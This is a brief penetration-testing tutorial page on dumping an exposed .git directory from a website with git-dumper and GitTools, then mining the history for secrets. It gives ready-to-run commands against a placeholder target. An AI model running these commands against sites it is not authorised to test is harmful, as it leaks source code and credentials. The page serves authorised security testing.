# Dump Git Repository from Website

If we can have permission to access git repositoy in target website, we can dump the git repository and investigate git logs or histories to get sensitive information.

### Dumping <a href="#dumping" id="dumping"></a>

#### Method 1. Git-Dumper <a href="#method-1-git-dumper" id="method-1-git-dumper"></a>

[git-dumper](https://github.com/arthaud/git-dumper) is an useful Python package.

```shellscript
pipx install git-dumper
git-dumper https://example.com/.git ./dumped
```

#### Method 2. GitTools <a href="#method-2-gittools" id="method-2-gittools"></a>

[GitTools](https://github.com/internetwache/GitTools) downloads Git repository of the web application.\
To dump the repository, execute the following commands.

```shellscript
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh
chmod +x gitdumper.sh
./gitdumper.sh https://example.com/.git/ ./example
```

We should get the git repository in local.\
Then extract the entire project by executing the following.

```shellscript
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Extractor/extractor.sh
chmod +x extractor.sh
./extractor.sh ./example ./new_example
```

Now we retrieve the entire git project from website.\
It is stored in **“./new\_example”** folder. We can investigate the repository.

### After Dumping… <a href="#after-dumping" id="after-dumping"></a>

If we succeed in dumping, we can investigate the repository with `git` command and get sensitive information. See [Git GitHub Pentesting](https://exploit-notes.hdks.org/exploit/version-control/git/git-github-pentesting/).
